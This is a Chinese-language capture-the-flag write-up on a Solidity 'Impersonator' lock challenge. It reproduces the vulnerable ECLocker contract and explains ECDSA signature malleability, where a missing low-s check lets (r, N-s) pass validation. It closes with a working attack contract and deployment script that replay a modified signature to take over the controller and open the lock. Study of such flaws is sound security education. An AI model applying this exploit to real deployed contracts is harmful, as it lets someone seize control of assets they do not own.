# impersonator 签名

# 源码

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import "../lib/openzeppelin-contracts/contracts/access/Ownable.sol";

//0x88A17db293F4Ee4b85C5C14E457FF61781D7c5b7

// SlockDotIt ECLocker factory
abstract contract Impersonator is Ownable {
    uint256 public lockCounter;
    ECLocker[] public lockers;

    event NewLock(
        address indexed lockAddress,
        uint256 lockId,
        uint256 timestamp,
        bytes signature
    );

    constructor(uint256 _lockCounter) {
        lockCounter = _lockCounter;
    }

    function deployNewLock(bytes memory signature) public onlyOwner {
        // Deploy a new lock
        ECLocker newLock = new ECLocker(++lockCounter, signature);
        lockers.push(newLock);
        emit NewLock(address(newLock), lockCounter, block.timestamp, signature);
    }
}

contract ECLocker {
    uint256 public immutable lockId;
    bytes32 public immutable msgHash;
    address public controller;
    mapping(bytes32 => bool) public usedSignatures;

    event LockInitializated(
        address indexed initialController,
        uint256 timestamp
    );
    event Open(address indexed opener, uint256 timestamp);
    event ControllerChanged(address indexed newController, uint256 timestamp);

    error InvalidController();
    error SignatureAlreadyUsed();

    /// @notice Initializes the contract the lock
    /// @param _lockId uinique lock id set by SlockDotIt's factory
    /// @param _signature the signature of the initial controller
    constructor(uint256 _lockId, bytes memory _signature) {
        // Set lockId
        lockId = _lockId;

        // Compute msgHash
        bytes32 _msgHash;
        assembly {
            mstore(0x00, "\x19Ethereum Signed Message:\n32") // 28 bytes
            mstore(0x1C, _lockId) // 32 bytes
            _msgHash := keccak256(0x00, 0x3c) //28 + 32 = 60 bytes
        }
        msgHash = _msgHash;

        // Recover the initial controller from the signature
        address initialController = address(1);
        assembly {
            let ptr := mload(0x40)
            mstore(ptr, _msgHash) // 32 bytes
            mstore(add(ptr, 32), mload(add(_signature, 0x60))) // 32 byte v
            mstore(add(ptr, 64), mload(add(_signature, 0x20))) // 32 bytes r
            mstore(add(ptr, 96), mload(add(_signature, 0x40))) // 32 bytes s
            pop(
                staticcall(
                    gas(), // Amount of gas left for the transaction.
                    initialController, // Address of `ecrecover`.
                    ptr, // Start of input.
                    0x80, // Size of input.
                    0x00, // Start of output.
                    0x20 // Size of output.
                )
            )
            if iszero(returndatasize()) {
                mstore(0x00, 0x8baa579f) // `InvalidSignature()`.
                revert(0x1c, 0x04)
            }
            initialController := mload(0x00)
            mstore(0x40, add(ptr, 128))
        }

        // Invalidate signature
        usedSignatures[keccak256(_signature)] = true;

        // Set the controller
        controller = initialController;

        // emit LockInitializated
        emit LockInitializated(initialController, block.timestamp);
    }

    /// @notice Opens the lock
    /// @dev Emits Open event
    /// @param v the recovery id
    /// @param r the r value of the signature
    /// @param s the s value of the signature
    function open(uint8 v, bytes32 r, bytes32 s) external {
        address add = _isValidSignature(v, r, s);
        emit Open(add, block.timestamp);
    }

    /// @notice Changes the controller of the lock
    /// @dev Updates the controller storage variable
    /// @dev Emits ControllerChanged event
    /// @param v the recovery id
    /// @param r the r value of the signature
    /// @param s the s value of the signature
    /// @param newController the new controller address
    function changeController(
        uint8 v,
        bytes32 r,
        bytes32 s,
        address newController
    ) external {
        _isValidSignature(v, r, s);
        controller = newController;
        emit ControllerChanged(newController, block.timestamp);
    }

    function _isValidSignature(
        uint8 v,
        bytes32 r,
        bytes32 s
    ) internal returns (address) {
        address _address = ecrecover(msgHash, v, r, s);
        require(_address == controller, InvalidController());

        bytes32 signatureHash = keccak256(
            abi.encode([uint256(r), uint256(s), uint256(v)])
        );
        require(!usedSignatures[signatureHash], SignatureAlreadyUsed());

        usedSignatures[signatureHash] = true;

        return _address;
    }
}


```

# ECDSA签名

以太坊交易使用的是 **ECDSA**（椭圆曲线数字签名算法）。

一个签名由以下三部分组成：

* `r`（32字节）
* `s`（32字节）
* `v`（1字节，用来标识哪个公钥对应这个签名）

签名的数学过程简化理解就是：

* 私钥 `d` 对消息 `m` 生成 `(r, s)`；
* 验证时用公钥 `Q` 去解 `(r, s)`，判断是不是匹配。

在以太坊里，我们常用 <code>**ecrecover(hash, v, r, s)**</code> 从签名推导出**公钥对应的地址**。

这里因为 ECDSA 的 `(r, s)` 和 `(r, n-s)` 都是合法签名，如果合约没有做低 s 检查，就能被利用。

## **ecrecover(hash, v, r, s)**

solidity的一个内置函数，语法是：

```solidity
address recovered = ecrecover(hash, v, r, s);
```

v：27或28

## 签名可拓展性

在 ECDSA 中，曲线上有个大数 **N**

```solidity
uint256 constant N =
        0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141;
```

签名 `(r, s)` 有一个“对称点”性质：

<code>**(r, s)**</code>\*\* 和 \*\*<code>**(r, N - s)**</code>**都是合法的签名**

* 如果合约只验证 `ecrecover` 得到的地址，而没有限制 `s` 的范围，那么攻击者可以伪造出另一份不同但合法的签名

# 思路

这题需要拿着题目实例，去区块链浏览器上看vrs都是多少，然后贴回来，N-s签

# poc

```solidity
// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.0;

import {ECLocker} from "../src/Impersonator.sol";
import {Impersonator} from "../src/Impersonator.sol";

contract Attack {
    ECLocker public eclocker;
    Impersonator public factory;
    uint256 constant N =
        0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141;

    constructor(address addr) {
        factory = Impersonator(addr);
        eclocker = factory.lockers(0);
    }

    function attack() external {
        bytes32 r = 0x1932cb842d3e27f54f79f7be0289437381ba2410fdefbae36850bee9c41e3b91;

        bytes32 s = 0x78489c64a0db16c40ef986beccc8f069ad5041e5b992d76fe76bba057d9abff2;
        uint8 v = 28;
        uint256 n = N;
        bytes32 new_s = bytes32(n - uint256(s));
        eclocker.changeController(v, r, new_s, address(0));
        eclocker.open(0, 0x00, 0x00);//别忘记open
    }
}

```

```solidity
// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.0;

import {Script} from "../lib/forge-std/src/Script.sol";
import {Attack} from "../src/Attack.sol";
import {ECLocker} from "../src/Impersonator.sol";
import {Impersonator} from "../src/Impersonator.sol";

contract Attacksc is Script {
    function run() external {
        vm.startBroadcast();
        Attack attack = new Attack(0x88A17db293F4Ee4b85C5C14E457FF61781D7c5b7);
        attack.attack();
        vm.stopBroadcast();
    }
}

```


> 更新: 2025-09-04 14:13:23  
> 原文: <https://www.yuque.com/xiaoyuhushenfu/yzin4n/ptmcfv6km7tnvixp>